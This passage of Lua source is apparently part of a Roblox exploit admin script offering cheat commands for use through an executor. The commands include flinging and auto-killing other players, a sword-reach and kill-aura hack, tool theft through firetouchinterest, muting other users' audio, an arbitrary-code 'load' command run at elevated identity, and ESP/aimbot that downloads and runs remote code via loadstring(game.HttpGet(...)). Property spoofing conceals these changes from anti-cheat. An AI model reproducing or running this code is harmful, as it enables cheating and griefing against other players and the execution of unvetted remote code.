			for i2, v2 in next, Tools do
				if (IsA(v2, "Tool")) then
					v2.Parent = GetCharacter();
					CFrameTool(v2, TRoot.CFrame);
					local Handle = v2.Handle
					for i3 = 1, 3 do
						if (TRoot and Handle) then
							firetouchinterest(TRoot, Handle, 1);
							firetouchinterest(TRoot, Handle, 1);
						end
					end
				end
				if (i2 == ToolAmount) then
					break
				end
			end
		end
		wait(.2);
		Destroy(Char);
		Char = CWait(LocalPlayer.CharacterAdded);
		WaitForChild(Char, "HumanoidRootPart").CFrame = OldPos
	end)

	AddCommand("grabtools", {"gt"}, "grabs tools in the workspace", {3}, function(Caller, Args)
		local Tools = filter(GetDescendants(Services.Workspace), function(i,v)
			return IsA(v, "Tool") and FindFirstChild(v, "Handle");
		end)
		UnequipTools(GetHumanoid());
		local ToolAmount = #GetChildren(LocalPlayer.Backpack);
		for i, v in next, Tools do
			if (v.Handle) then
				firetouchinterest(v.Handle, GetRoot(), 0);
				wait();
				firetouchinterest(v.Handle, GetRoot(), 1);
			end
		end
		wait(.4);
		UnequipTools(GetHumanoid());
		return format(("grabbed %d tool (s)"), #GetChildren(LocalPlayer.Backpack) - ToolAmount)
	end)

	AddCommand("autograbtools", {"agt", "loopgrabtools", "lgt"}, "once a tool is added to workspace it will be grabbed", {3}, function(Caller, Args, CEnv)
		AddConnection(CConnect(Services.Workspace.ChildAdded, function(Child)
			if (IsA(Child, "Tool") and FindFirstChild(Child, "Handle")) then
				firetouchinterest(Child.Handle, GetRoot(), 0);
				wait();
				firetouchinterest(Child.Handle, GetRoot(), 1);
				UnequipTools(GetHumanoid());
			end
		end), CEnv)
		return "tools will be grabbed automatically"
	end)

	AddCommand("unautograbtools", {"unloopgrabtools"}, "stops autograbtools", {}, function()
		DisableAllCmdConnections("autograbtools");
		return "auto grabtools disabled"
	end)

	AddCommand("droptools", {"dt"}, "drops all of your tools", {1,3}, function()
		UnequipTools(GetHumanoid());
		local Tools = GetChildren(LocalPlayer.Backpack);
		for i, v in next, Tools do
			if (IsA(v, "Tool") and FindFirstChild(v, "Handle")) then
				SpoofProperty(v, "Parent");
				v.Parent = GetCharacter();
				v.Parent = Services.Workspace
			end
		end
		return format(("dropped %d tool (s)"), #Tools);
	end)

	AddCommand("nohats", {"nh"}, "removes all the hats from your character", {3}, function()
		local Humanoid = GetHumanoid();
		local HatAmount = #GetAccessories(Humanoid);
		for i, v in next, GetAccessories(Humanoid) do
			Destroy(v);
		end
		return format(("removed %d hat (s)"), HatAmount - #GetAccessories(Humanoid));
	end)

	AddCommand("clearhats", {"ch"}, "clears all of the hats in workspace", {3}, function()
		local Humanoid = GetHumanoid();
		for i, v in next, GetAccessories(Humanoid) do
			Destroy(v);
		end
		local Amount = 0
		for i, v in next, GetChildren(Services.Workspace) do
			if (IsA(v, "Accessory") and FindFirstChild(v, "Handle")) then
				firetouchinterest(v.Handle, GetRoot(), 0);
				wait();
				firetouchinterest(v.Handle, GetRoot(), 1);
				Destroy(WaitForChild(GetCharacter(), v.Name));
				Amount = Amount + 1
			end
		end
		return format(("cleared %d hat (s)"), Amount);
	end)

	AddCommand("gravity", {"grav"}, "sets the worksapaces gravity", {"1"}, function(Caller, Args)
		SpoofProperty(Services.Workspace, "Gravity");
		Services.Workspace.Gravity = tonumber(Args[1]) or Services.Workspace.Gravity
	end)

	AddCommand("nogravity", {"nograv", "ungravity"}, "removes the gravity", {}, function()
		Services.Workspace.Gravity = 192
	end)

	AddCommand("chatmute", {"cmute"}, "mutes a player in your chat", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local MuteRequest = Services.ReplicatedStorage.DefaultChatSystemChatEvents.MutePlayerRequest
		for i, v in next, Target do
			MuteRequest.InvokeServer(MuteRequest, v.Name);
			Utils.Notify(Caller, "Command", format("%s is now muted on your chat", v.Name));
		end
	end)

	AddCommand("unchatmute", {"uncmute"}, "unmutes a player in your chat", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local MuteRequest = Services.ReplicatedStorage.DefaultChatSystemChatEvents.UnMutePlayerRequest
		for i, v in next, Target do
			MuteRequest.InvokeServer(MuteRequest, v.Name);
			Utils.Notify(Caller, "Command", format("%s is now unmuted on your chat", v.Name));
		end
	end)

	AddCommand("delete", {}, "puts a players character in lighting", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			if (v.Character) then
				SpoofProperty(v.Character, "Parent");
				v.Character.Parent = Lighting
				Utils.Notify(Caller, "Command", v.Name .. "'s character is now parented to lighting");
			end
		end
	end)

	AddCommand("loopdelete", {"ld"}, "loop of delete command", {"1"}, function(Caller, Args, CEnv)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			if (v.Character) then
				SpoofProperty(v.Character, "Parent");
				v.Character.Parent = Lighting
			end
			local Connection = CConnect(v.CharacterAdded, function()
				v.Character.Parent = Lighting
			end)
			CEnv[v.Name] = Connection
			AddPlayerConnection(v, Connection);
		end
	end)

	AddCommand("unloopdelete", {"unld"}, "unloop the loopdelete", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Looping = LoadCommand("loopdelete").CmdEnv
		for i, v in next, Target do
			if (Looping[v.Name]) then
				Disconnect(Looping[v.Name]);
			end
		end
	end)

	AddCommand("recover", {"undelete"}, "removes a players character parented from lighting", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			if (v.Character and v.Character.Parent == Lighting) then
				v.Character.Parent = Services.Workspace
				Utils.Notify(Caller, "Command", v.Name .. "'s character is now in workspace");
			else
				Utils.Notify(Caller, "Command", v.Name .. "'s character is not removed");
			end
		end
	end)

	AddCommand("load", {"loadstring"}, "loads whatever you want", {"1"}, function(Caller, Args)
		local Code = concat(Args, " ");
		local Success, Err = pcall(function()
			local Func = loadstring(Code);
			setfenv(Func, getrenv());
			local Context;
			local sett, gett = syn and syn_context_set or setidentity, syn and syn_context_get or getidentity
			if (sett and gett) then
				Context = gett();
				sett(2);
			end
			Func();
			if (Context and sett) then
				sett(Context);
			end
		end)
		if (not Success and Err) then
			return Err
		else
			return Func ~= nil and tostring(Func) or "executed with no errors"
		end
	end)

	AddCommand("sit", {}, "makes you sit", {3}, function(Caller, Args, CEnv)
		local Humanoid = GetHumanoid();
		SpoofProperty(Humanoid, "Sit", false);
		Humanoid.Sit = true
		return "now sitting (obviously)"
	end)

	AddCommand("infinitejump", {"infjump"}, "infinite jump no cooldown", {3}, function(Caller, Args, CEnv)
		AddConnection(CConnect(Services.UserInputService.JumpRequest, function()
			local Humanoid = GetHumanoid();
			if (Humanoid) then
				ChangeState(Humanoid, 3);
			end
		end), CEnv);
		return "infinite jump enabled"
	end)

	AddCommand("noinfinitejump", {"uninfjump", "noinfjump"}, "removes infinite jump", {}, function()
		local InfJump = LoadCommand("infjump").CmdEnv
		if (not next(InfJump)) then
			return "you are not infinite jumping"
		end
		DisableAllCmdConnections("infinitejump");
		return "infinite jump disabled"
	end)

	AddCommand("headsit", {"hsit"}, "sits on the players head", {"1"}, function(Caller, Args, CEnv)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			local Humanoid = GetHumanoid();
			SpoofProperty(Humanoid, "Sit");
			Humanoid.Sit = true
			AddConnection(CConnect(GetPropertyChangedSignal(Humanoid, "Sit"), function()
				Humanoid.Sit = true
			end), CEnv);
			local Root = GetRoot();
			AddConnection(CConnect(Heartbeat, function()
				Root.CFrame = v.Character.Head.CFrame * CFrameNew(0, 0, 1);
			end), CEnv);
		end
	end)

	AddCommand("unheadsit", {"noheadsit"}, "unheadsits on the target", {3}, function(Caller, Args)
		local Looped = LoadCommand("headsit").CmdEnv
		for i, v in next, Looped do
			Disconnect(v);
		end
		return "headsit disabled"
	end)

	AddCommand("headstand", {"hstand"}, "stands on a players head", {"1",3}, function(Caller, Args, CEnv)
		local Target = GetPlayer(Args[1]);
		local Root = GetRoot();
		for i, v in next, Target do
			local Loop = CConnect(Heartbeat, function()
				Root.CFrame = v.Character.Head.CFrame * CFrameNew(0, 1, 0);
			end)
			CEnv[v.Name] = Loop
			AddPlayerConnection(v, Loop);
		end
	end)

	AddCommand("unheadstand", {"noheadstand"}, "unheadstands on the target", {3}, function(Caller, Args)
		local Looped = LoadCommand("headstand").CmdEnv
		for i, v in next, Looped do
			Disconnect(v);
		end
		return "headstand disabled"
	end)

	AddCommand("setspawn", {}, "sets your spawn location to the location you are at", {3}, function(Caller, Args, CEnv)
		if (CEnv[1]) then
			Disconnect(CEnv[1]);
		end
		local Position = GetRoot().CFrame
		local Spawn = CConnect(LocalPlayer.CharacterAdded, function()
			WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = Position
		end)
		CEnv[1] = Spawn
		AddPlayerConnection(LocalPlayer, Spawn);
		local SpawnLocation = pack(unpack(split(tostring(Position), ", "), 1, 3));
		SpawnLocation.n = nil
		return "spawn successfully set to " .. concat(map(SpawnLocation, function(i,v)
			return tostring(round(tonumber(v)));
		end), ",");
	end)

	AddCommand("removespawn", {}, "removes your spawn location", {}, function(Caller, Args)
		local Spawn = LoadCommand("setspawn").CmdEnv[1]
		if (Spawn) then
			Disconnect(Spawn);
			return "removed spawn location"
		end
		return "you don't have a spawn location set"
	end)

	AddCommand("ping", {}, "shows you your ping", {}, function()
		local Stats = Services.Stats
		local DataPing = Stats.Network.ServerStatsItem["Data Ping"]
		return split(DataPing.GetValueString(DataPing), " ")[1] .. " ms"
	end)

	AddCommand("memory", {"mem"}, "shows you your memory usage", {}, function()
		local Stats = Services.Stats
		return tostring(round(Stats.GetTotalMemoryUsageMb(Stats))) .. " mb";
	end)

	AddCommand("fps", {"frames"}, "shows you your framerate", {}, function()
		local FPS = 1 / CWait(RenderStepped);
		local Counter = Utils.Notify(LocalPlayer, "FPS", round(FPS));
		local Running;
		delay(4.5, function()
			Disconnect(Running);
		end);
		Running = CConnect(Heartbeat, function()
			if (not Counter or not Counter.Message) then
				Disconnect(Running);
			end
			Counter.Message.Text = round(1 / CWait(RenderStepped));
		end);
	end)

	AddCommand("displaynames", {}, "enables/disables display names (on/off)", {{"on","off"}}, function(Caller, Args, CEnv)
		local Option = Args[1]
		local Players = Services.Players

		local ShowName = function(v)
			if (v.Name ~= v.DisplayName) then
				if (v.Character) then
					v.Character.Humanoid.DisplayName = v.Name
				end
				local Connection = CConnect(v.CharacterAdded, function()
					WaitForChild(v.Character, "Humanoid").DisplayName = v.Name
				end)
				CEnv[v.Name] = {v.DisplayName, Connection}
				AddPlayerConnection(v, Connection);
			end
		end
		if (lower(Option) == "off") then
			for i, v in next, GetPlayers(Players) do
				ShowName(v);
			end
			AddConnection(CConnect(Players.PlayerAdded, ShowName));
			return "people with a displayname displaynames will be shown"
		elseif (lower(Option) == "on") then
			for i, v in next, LoadCommand("displaynames").CmdEnv do
				if (type(v) == 'userdata' and v.Disconnect) then
					Disconnect(v);
				else
					if (i.Character) then
						i.Character.Humanoid.DisplayName = v[1]
					end
					Disconnect(v[2]);
					v = nil
				end
			end
			return "people with a displayname displaynames will be removed"
		end
	end)

	AddCommand("time", {"settime"}, "sets the games time", {{"night", "day", "dawn"}}, function(Caller, Args)
		local Lighting = Services.Lighting
		local Time = Args[1] and lower(Args[1]) or 14
		local Times = {["night"]=0,["day"]=14,["dawn"]=6}
		SpoofProperty(Lighting, "ClockTime", true);
		Lighting.ClockTime = Times[Time] or Time
	end)

	AddCommand("fling", {"stan"}, "flings a player", {}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Root = GetRoot()
		SpoofProperty(Root, "Velocity");
		SpoofProperty(Root, "Anchored");
		local OldPos, OldVelocity = Root.CFrame, Root.Velocity

		for i, v in next, Target do
			local TargetRoot = GetRoot(v);
			local TargetPos = TargetRoot.Position
			local Running = CConnect(Stepped, function(step)
				step = step - Services.Workspace.DistributedGameTime

				Root.CFrame = (TargetRoot.CFrame - (Vector3New(0, 1e6, 0) * step)) + (TargetRoot.Velocity * (step * 30))
				Root.Velocity = Vector3New(0, 1e6, 0)
			end)
			local starttime = tick();
			repeat
				wait();
			until (TargetPos - TargetRoot.Position).magnitude >= 60 or tick() - starttime >= 3.5
			Disconnect(Running);
		end
		wait();
		local Running = CConnect(Stepped, function()
			Root.Velocity = OldVelocity
			Root.CFrame = OldPos
		end)
		wait(2);
		Root.Anchored = true
		Disconnect(Running);
		Root.Anchored = false
		Root.Velocity = OldVelocity
		Root.CFrame = OldPos
	end)

	AddCommand("fling2", {"stan2"}, "another variant of fling", {}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Root = GetRoot();
		local OldPos = Root.CFrame
		local OldVelocity = Root.Velocity
		local BodyVelocity = InstanceNew("BodyAngularVelocity");
		ProtectInstance(BodyVelocity);
		BodyVelocity.MaxTorque = Vector3New(1, 1, 1) * math.huge
		BodyVelocity.P = math.huge
		BodyVelocity.AngularVelocity = Vector3New(0, 9e5, 0);
		BodyVelocity.Parent = Root

		local Char = GetChildren(GetCharacter());
		for i, v in next, Char do
			if (IsA(v, "BasePart")) then
				v.CanCollide = false
				v.Massless = true
				v.Velocity = Vector3New(0, 0, 0);
			end
		end
		local Noclipping = CConnect(Stepped, function()
			for i, v in next, Char do
				if (IsA(v, "BasePart")) then
					v.CanCollide = false
				end
			end
		end)
		for i, v in next, Target do
			local Fling
			Fling = CConnect(Stepped, function()
				Root.CFrame = GetRoot(v).CFrame
			end)
			local Continue = false
			delay(2, function()
				Continue = true
			end)
			repeat wait() until GetMagnitude(v) >= 60 or Continue
			Disconnect(Fling);
		end
		Destroy(BodyVelocity);
		Disconnect(Noclipping);
		for i, v in next, Char do
			if (IsA(v, "BasePart")) then
				v.CanCollide = true
				v.Massless = false
			end
		end
		local Running = CConnect(Stepped, function()
			Root.CFrame = OldPos
			Root.Velocity = OldVelocity
		end)
		wait(2);
		Root.Anchored = true
		Disconnect(Running);
		Root.Anchored = false
		Root.Velocity = OldVelocity
		Root.CFrame = OldPos
	end)

	AddCommand("antitkill", {}, "anti tkill :troll:", {3}, function(Caller, Args)
		Destroy(GetCharacter()["Right Arm"]);
		return "lol"
	end)

	AddCommand("antiattach", {"anticlaim"}, "enables antiattach", {3}, function(Caller, Args)
		local Tools = {}
		for i, v in next, tbl_concat(GetChildren(LocalPlayer.Character), GetChildren(LocalPlayer.Backpack)) do
			if (IsA(v, "Tool")) then
				Tools[#Tools + 1] = v
			end
		end
		AddConnection(CConnect(LocalPlayer.Character.ChildAdded, function(x)
			if (not Tfind(Tools, x) and IsA(x, "Tool")) then
				x.Parent = LocalPlayer.Backpack
			end
		end))
	end)

	AddCommand("attach", {}, "attaches you to another player", {3,1}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Humanoid = ReplaceHumanoid();
		local Char = GetCharacter();
		for i, v in next, Target do
			local Tool = FindFirstChildWhichIsA(Char, "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
			Tool.Parent = Char
			local TargetRoot = GetRoot(v);
			if (TargetRoot and Tool) then
				firetouchinterest(TargetRoot, Tool.Handle, 0);
				firetouchinterest(TargetRoot, Tool.Handle, 1);
			end
		end
	end)

	AddCommand("skill", {"swordkill"}, "swordkills the user auto", {1, {"player", "manual"}}, function(Caller, Args)
		local Target, Option = GetPlayer(Args[1]), Args[2] or ""
		local Backpack, Character = LocalPlayer.Backpack, GetCharacter();
		local Tool = FindFirstChild(Character, "ClassicSword") or FindFirstChild(Backpack, "ClassicSword") or FindFirstChildOfClass(Backpack, "Tool") or FindFirstChildOfClass(Character, "Tool");
		Tool.Parent = Character
		local OldPos = GetRoot().CFrame
		for i, v in next, Target do
			CThread(function()
				if (FindFirstChild(v.Character, "ForceField")) then
					repeat wait() until not FindFirstChild(v.Character, "ForceField");
				end
				for i2 = 1, 5 do
					if (lower(Option) == "manual") then
						GetRoot().CFrame = GetRoot(v).CFrame * CFrameNew(0, -3, 0);
						Tool.Activate(Tool);
						Tool.Activate(Tool);
						wait();
					else
						Tool.Activate(Tool);
						firetouchinterest(Tool.Handle, GetRoot(v), 0);
						wait();
						firetouchinterest(Tool.Handle, GetRoot(v), 1);
						wait();
					end
				end
				wait();
				if (lower(Option) == "manual") then
					WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
				end
			end)()
		end
	end)

	AddCommand("reach", {"swordreach"}, "changes handle size of your tool", {1, 3}, function(Caller, Args, CEnv)
		local Amount = Args[1] or 2
		local Tool = FindFirstChildWhichIsA(LocalPlayer.Character, "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
		local Handle = Tool.Handle
		local Size = Handle.Size
		CEnv[Tool] = Size
		SpoofProperty(Handle, "Size");
		SpoofProperty(Handle, "Massless");
		Handle.Size = Vector3New(Size.X, Size.Y, tonumber(Amount or 30));
		Handle.Massless = true
		return "reach on"
	end)

	AddCommand("noreach", {"noswordreach"}, "removes sword reach", {}, function()
		local ReachedTools = LoadCommand("reach").CmdEnv
		if (not next(ReachedTools)) then
			return "reach isn't enabled"
		end
		for i, v in next, ReachedTools do
			i.Size = v
		end
		LoadCommand("reach").CmdEnv = {}
		return "reach disabled"
	end)

	AddCommand("swordaura", {"saura"}, "sword aura", {3}, function(Caller, Args, CEnv)
		DisableAllCmdConnections("swordaura");

		local SwordDistance = tonumber(Args[1]) or 10
		local Tool = FindFirstChildWhichIsA(GetCharacter(), "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
		local PlayersTbl = filter(GetPlayers(Players), function(i, v)
			return v ~= LocalPlayer
		end)
		PlayersTbl = map(PlayersTbl, function(i, Player)
			AddConnection(CConnect(Player.CharacterAdded, function()
				PlayersTbl[i] = {Player, Player.Character}
			end), CEnv);
			return {Player, Player.Character}
		end)

		local Hit = function(i, v)
			Tool.Activate(Tool);
			if (FindFirstChild(Tool, "Handle")) then
				firetouchinterest(Tool.Handle, v, 0);
				wait();
				firetouchinterest(Tool.Handle, v, 1);
			elseif (FindFirstChild(Tool, "HitBox")) then
				firetouchinterest(Tool.HitBox, v, 0);
				wait();
				firetouchinterest(Tool.HitBox, v, 1);
			else 
				local Part = FindFirstChildOfClass(Tool, "Part")
				if (Part) then
					firetouchinterest(Tool.HitBox, v, 0);
					wait();
					firetouchinterest(Tool.HitBox, v, 1);
				end
			end
		end
		local Character = GetCharacter();
		AddConnection(CConnect(Heartbeat, function()
			Character = Character or GetCharacter();
			Tool = FindFirstChildWhichIsA(Character, "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
			if (Tool and Tool.Handle) then
				for i, v in next, PlayersTbl do
					if (GetRoot(v[1], v[2]) and GetHumanoid(v[1], v[2]) and GetHumanoid(v[1], v[2]).Health ~= 0 and GetMagnitude(v[1], v[2]) <= SwordDistance) then
						if (GetHumanoid().Health ~= 0) then
							Tool.Parent = Character
							local BaseParts = filter(GetChildren(GetCharacter(v[1], v[2])), function(i, v)
								return IsA(v, "BasePart");
							end)
							forEach(BaseParts, Hit);
						end
					end
				end
			end
		end), CEnv);

		AddConnection(CConnect(Players.PlayerAdded, function(Plr)
			PlayersTbl[#PlayersTbl + 1] = Plr
		end), CEnv);
		AddConnection(CConnect(Players.PlayerRemoving, function(Plr)
			PlayersTbl[indexOf(PlayersTbl, Plr)] = nil
		end), CEnv);

		return "sword aura enabled with distance " .. SwordDistance
	end)

	AddCommand("noswordaura", {"noaura"}, "stops the sword aura", {}, function()
		local Aura = LoadCommand("swordaura").CmdEnv
		if (not next(Aura)) then
			return "sword aura is not enabled"
		end
		DisableAllCmdConnections("swordaura");
		return "sword aura disabled"
	end)

	AddCommand("freeze", {}, "freezes your character", {3}, function(Caller, Args)
		local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
			return IsA(v, "BasePart");
		end)
		for i, v in next, BaseParts do
			SpoofProperty(v, "Anchored");
			v.Anchored = true
		end
		return "freeze enabled (client)"
	end)

	AddCommand("unfreeze", {"thaw"}, "unfreezes your character", {3}, function(Caller, Args)
		local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
			return IsA(v, "BasePart");
		end)
		for i, v in next, BaseParts do
			v.Anchored = false
		end
		return "freeze disabled"
	end)

	AddCommand("streamermode", {}, "changes names of everyone to something random", {}, function(Caller, Args, CEnv)
		local Rand = function(len) return gsub(sub(GenerateGUID(Services.HttpService), 2, len), "-", "") end
		local Players = Services.Players
		local Hide = function(a, v)
			if (v and IsA(v, "TextLabel") or IsA(v, "TextButton")) then
				local Player = GetPlayer(v.Text, true);
				if (not Player[1]) then
					Player = GetPlayer(sub(v.Text, 2, #v.Text - 2), true);
				end
				v.Text = Player[1] and Player[1].Name or v.Text
				if (Player and FindFirstChild(Players, v.Text)) then
					CEnv[v.Name] = v.Text
					local NewName = Rand(len(v.Text));
					if (GetCharacter(v.Text)) then
						Players[v.Text].Character.Humanoid.DisplayName = NewName
					end
					v.Text = NewName
				end
			end
		end

		forEach(GetDescendants(game), Hide);

		AddConnection(CConnect(game.DescendantAdded, function(x)
			Hide(nil, x);
		end), CEnv);
		return "streamer mode enabled"
	end)

	AddCommand("nostreamermode", {"unstreamermode"}, "removes all the changed names", {}, function(Caller, Args, CEnv)
		local changed = LoadCommand("streamermode").CmdEnv
		for i, v in next, changed do
			if (type(v) == 'userdata' and v.Disconnect) then
				Disconnect(v);
			else
				i.Text = v
			end
		end
	end)

	AddCommand("fireclickdetectors", {"fcd"}, "fires all the click detectors", {3}, function(Caller, Args)
		local amount = 0
		local howmany = Args[1]
		for i, v in next, GetDescendants(Services.Workspace) do
			if (IsA(v, "ClickDetector")) then
				fireclickdetector(v);
				amount = amount + 1
				if (howmany and amount == tonumber(howmany)) then break; end
			end
		end
		return format("fired %d amount of clickdetectors", amount);
	end)

	AddCommand("firetouchinterests", {"fti"}, "fires all the touch interests", {3}, function(Caller, Args)
		local amount = 0
		local howmany = Args[1]
		for i, v in next, GetDescendants(Services.Workspace) do
			if (IsA(v, "TouchTransmitter")) then
				firetouchinterest(GetRoot(), v.Parent, 0);
				wait();
				firetouchinterest(GetRoot(), v.Parent, 1);
				amount = amount + 1
				if (howmany and amount == tonumber(howmany)) then break; end
			end
		end
		return format("fired %d amount of touchtransmitters", amount);
	end)

	AddCommand("fireproximityprompts", {"fpp"}, "fires all the proximity prompts", {3}, function(Caller, Args)
		local amount = 0
		local howmany = Args[1]
		for i, v in next, GetDescendants(Services.Workspace) do
			if (IsA(v, "ProximityPrompt")) then
				fireproximityprompt(v, 0);
				wait();
				fireproximityprompt(v, 1);
				amount = amount + 1
				if (howmany and amount == tonumber(howmany)) then break; end
			end
		end
		return format("fired %d amount of proximityprompts", amount);
	end)

	AddCommand("muteboombox", {}, "mutes a users boombox", {}, function(Caller, Args)
		Services.SoundService.RespectFilteringEnabled = false
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			for i2, v2 in next, GetDescendants(v.Character) do
				if (IsA(v2, "Sound")) then
					v2.Playing = false
				end
			end
		end
		Services.SoundService.RespectFilteringEnabled = true
	end)

	AddCommand("loopmuteboombox", {"loopmute"}, "loop mutes a users boombox", {}, function(Caller, Args, CEnv)
		local Target = GetPlayer(Args[1]);
		local filterBoomboxes = function(i,v)
			return FindFirstChild(v, "Handle") and FindFirstChildWhichIsA(v.Handle, "Sound");
		end
		Services.SoundService.RespectFilteringEnabled = false
		local Con = AddConnection(CConnect(Heartbeat, function()
			for i, v in next, Target do
				for i2, v2 in next, GetDescendants(v.Backpack) do
					if (IsA(v2, "Sound")) then
						v2.Playing = false
					end
				end
				local Char = GetCharacter(v)
				if (Char) then
					for i22, v2 in next, GetDescendants(Char) do
						if (IsA(v2, "Sound")) then
							v2.Playing = false
						end
					end
				end
			end
		end));
		CEnv[Target] = Con
	end)

	AddCommand("unloopmuteboombox", {}, "unloopmutes a persons boombox", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1])
		local Muting = LoadCommand("loopmuteboombox").CmdEnv
		for i, v in next, Muting do
			for i2, v2 in next, Target do
				if (v2 == i) then
					Disconnect(v);
					Muting[i] = nil
				end
			end
		end
	end)

	AddCommand("forceplay", {}, "forcesplays an audio", {1,3,"1"}, function(Caller, Args, CEnv)
		local Id = Args[1]
		local filterBoomboxes = function(i,v)
			return IsA(v, "Tool") and FindFirstChild(v, "Handle") and FindFirstChildWhichIsA(v.Handle, "Sound");
		end
		UnequipTools(GetHumanoid());
		local Boombox = filter(GetChildren(LocalPlayer.Backpack), filterBoomboxes)
		if (not next(Boombox)) then
			return "you need a boombox to forceplay"
		end
		Services.SoundService.RespectFilteringEnabled = false
		Boombox = Boombox[1]
		Boombox.Parent = GetCharacter();
		local Sound = Boombox.Handle.Sound
		Sound.SoundId = "http://roblox.com/asset/?id=" .. Id
		local RemoteEvent = FindFirstChildWhichIsA(Boombox, "RemoteEvent")
		RemoteEvent.FireServer(RemoteEvent, "PlaySong", tonumber(Id));
		Boombox.Parent = LocalPlayer.Backpack
		CEnv[Boombox] = true
		CThread(function()
			while (LoadCommand("forceplay").CmdEnv[Boombox]) do
				Boombox.Handle.Sound.Playing = true
				CWait(Heartbeat);
			end
			Services.SoundService.RespectFilteringEnabled = true
		end)()
		return "now forceplaying ".. Id
	end)

	AddCommand("unforceplay", {}, "stops forceplay", {}, function()
		local Playing = LoadCommand("forceplay").CmdEnv
		for i, v in next, Playing do
			FindFirstChild(i, "Sound", true).Playing = false
			LoadCommand("forceplay").CmdEnv[i] = false
		end
		return "stopped forceplay"
	end)

	AddCommand("audiotime", {"audiotimeposition"}, "changes audio timeposition", {"1",1}, function(Caller, Args)
		local Time = Args[1]
		if (not tonumber(Time)) then
			return "time must be a number"
		end
		local filterplayingboomboxes = function(i,v)
			return IsA(v, "Tool") and FindFirstChild(v, "Handle") and FindFirstChildWhichIsA(v.Handle, "Sound") and FindFirstChildWhichIsA(v.Handle, "Sound").Playing == true
		end
		local OtherPlayingBoomboxes = LoadCommand("forceplay").CmdEnv
		local Boombox = filter(tbl_concat(GetChildren(LocalPlayer.Backpack), GetChildren(GetCharacter())), filterplayingboomboxes)
		if (not next(Boombox) and not next(OtherPlayingBoomboxes)) then
			return "you need a boombox to change the timeposition"
		end
		Boombox = Boombox[1]
		if (Boombox) then
			FindFirstChild(Boombox, "Sound", true).TimePosition = floor(tonumber(Time));
		else
			for i, v in next, OtherPlayingBoomboxes do
				FindFirstChild(i, "Sound", true).TimePosition = floor(tonumber(Time));
			end
		end
		return "changed time position to " .. Time
	end)

	AddCommand("audiolog", {}, "audio logs someone", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			for i2, v2 in next, GetDescendants(v.Character) do
				if (IsA(v2, "Sound") and IsA(v2.Parent.Parent, "Tool")) then
					local AudioId = split(v2.SoundId, "=")[2]
					setclipboard(AudioId);
					Utils.Notify(Caller, "Command", format("Audio Id (%s) copied to clipboard", AudioId));
				end
			end
		end
	end)

	AddCommand("position", {"pos"}, "shows you a player's current (cframe) position", {}, function(Caller, Args)
		local Target = Args[1] and GetPlayer(Args[1])[1] or Caller
		local Root = GetRoot(Target)
		local Pos = Sanitize(Root.CFrame)
		if setclipboard then
			setclipboard(Pos)
		end
		return format("%s's position: %s", Target.Name, Pos);
	end)

	AddCommand("grippos", {}, "changes grippos of your tool", {"3"}, function(Caller, Args, CEnv)
		local Tool = FindFirstChildWhichIsA(GetCharacter(), "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
		if (Tool) then
			local GripPos = Vector3New(tonumber(Args[1]), tonumber(Args[2]), tonumber(Args[3]));
			if (Args[4]) then
				for i, v in next, tbl_concat(GetChildren(LocalPlayer.Backpack), GetChildren(LocalPlayer.Character)) do
					if (IsA(v, "Tool")) then
						SpoofProperty(Tool, "GripPos");
						Tool.GripPos = GripPos
					end
				end
			end
			SpoofProperty(Tool, "GripPos");
			Tool.GripPos = GripPos
			Tool.Parent = GetCharacter();
			return "grippos set"
		else
			return "no tool to set grippos"
		end
		return "grippos set"
	end)

	AddCommand("truesightguis", {"tsg"}, "true sight on all guis", {}, function(Caller, Args, CEnv)
		for i, v in next, GetDescendants(game) do
			if (IsA(v, "Frame") or IsA(v, "ScrollingFrame") and not v.Visible) then
				CEnv[v] = v.Visible
				SpoofProperty(v, "Visible");
				v.Visible = true
			end
		end
		return "truesight for guis are now on"
	end)

	AddCommand("notruesightguis", {"untruesightguis", "notsg"}, "removes truesight on guis", {}, function(Caller, Args)
		local Guis = LoadCommand("truesightguis").CmdEnv
		for i, v in next, Guis do
			i.Visible = v
		end
		return "truesight for guis are now off"
	end)

	AddCommand("esp", {"aimbot", "cameralock", "silentaim", "aimlock", "tracers"}, "loads fates esp", {}, function(Caller, Args, CEnv)
		CEnv.KillEsp = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/main.lua"))();
		return "esp enabled"
	end)

	AddCommand("unesp", {"noesp"}, "removes esp", {}, function()
		local Kill = LoadCommand("esp").CmdEnv.KillEsp
		if (Kill) then
			Kill()
		end
		return "esp removed"
	end)

	local EspLib;
	AddCommand("trace", {"locate"}, "traces a player", {"1"}, function(Caller, Args, CEnv)
		if (not EspLib) then
			EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
		end
		local Target = GetPlayer(Args[1]);
		local New = EspLib.new
		for i, v in next, Target do
			New("Tracer", {
				Target = v
			});
			New("Text", {
				Target = v,
				ShowHealth = true,
				ShowDistance = true
			});
		end
		AddConnection(CConnect(Services.Players.PlayerRemoving, function(Plr)
			if (Tfind(Target, Plr)) then
				EspLib.Remove(v);
			end
		end), CEnv);
